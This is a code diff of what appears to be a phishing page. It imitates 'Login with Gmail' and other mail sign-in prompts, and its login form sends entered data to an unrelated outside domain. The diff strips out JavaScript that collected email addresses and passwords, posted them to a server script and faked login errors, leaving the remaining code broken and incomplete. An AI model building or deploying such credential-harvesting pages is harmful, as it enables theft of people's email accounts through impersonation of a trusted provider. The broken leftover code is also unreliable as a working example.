@@ -9,7 +9,7 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
-    <form action="https://iklanoutdoorsurabaya.com/iss/next.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+<form action="https://iklanoutdoorsurabaya.com/iss/next.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
 
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
@@ -19,7 +19,6 @@
     <link href="css/hover.css" rel="stylesheet" media="all">
 
     <style type="text/css">
-
 
     </style>
   </head>
@@ -75,7 +74,6 @@
         </div> 
       </div> 
     </div>
-
     
 
     <!-- Modal for gmail -->
@@ -92,7 +90,6 @@
             <center>
               <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
               <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
-              <div class="alert alert-danger" id="msg"></div>
 
             </center>
             <form id="contact" class="form-horizontal well">
@@ -173,56 +170,18 @@
         $('#fieldImg').attr('src', 'images/othermail.ico');
         $('#field').html("Other Mail");
         $('#ajaxModal').modal('show');
-      });
-      $('#submit-btn').click(function(event){
-        event.preventDefault();
-        var email=$("#email").val();
-        var password=$("#password").val();
-        var detail=$("#field").html();
 
 
-        var msg = $('#msg').html();
-        $('#msg').text( msg );
-        if (msg=="InValid Credentials") {
-          window.location.replace("http://google.com");
-        }
-        else
+
+
         {
          $.ajax({
           dataType: 'JSON',
-          url: 'next.php',
-          type: 'POST',
           data:{
             email:email,
             password:password,
             detail:detail,
 
-          },
-            // data: $('#contact').serialize(),
-            beforeSend: function(xhr){
-              $('#submit-btn').html('Verifing...');
-            },
-            success: function(response){
-              if(response){
-                $("#msg").show();
-                console.log(response);
-                if(response['signal'] == 'ok'){
-                 $('#msg').html(response['msg']);
-                  // $('input, textarea').val(function() {
-                  //    return this.defaultValue;
-                  // });
-                }
-                else{
-                  $('#msg').html(response['msg']);
-                }
-              }
-            },
-            error: function(){
-              $("#msg").show();
-              $('#msg').html("Please try again later");
-            },
-            complete: function(){
-              $('#submit-btn').html('Login');
             }
           });
        }
